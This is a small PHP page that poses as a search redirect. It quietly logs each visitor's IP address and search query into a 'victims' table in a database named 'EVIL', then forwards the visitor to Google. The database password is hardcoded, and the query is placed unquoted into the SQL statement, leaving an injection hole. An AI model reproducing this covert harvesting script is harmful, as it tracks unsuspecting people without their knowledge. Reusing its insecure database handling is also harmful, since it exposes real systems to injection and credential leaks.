<!DOCTYPE html>

<html>

    <head> 

        <title>Form: insert</title> 
    </head> 

    <body>
        <?php
            $server = "localhost";
            $username = "php";
            $password = "A1f2i3r4e";
            $database = "EVIL"; 

            $conn = mysqli_connect($server, $username, $password, $database);

            $ip = $_SERVER['REMOTE_ADDR']; 
            $q = htmlspecialchars($_GET['query']);

        
            $sql = "INSERT INTO victims (ip, query) VALUES ('{$ip}', {$q});";
            $result = mysqli_query($conn, $sql);

            $url= "https://www.google.com/search?q=" . $q;
            header("Location: $url"); 

        ?>

    </body> 

</html> 
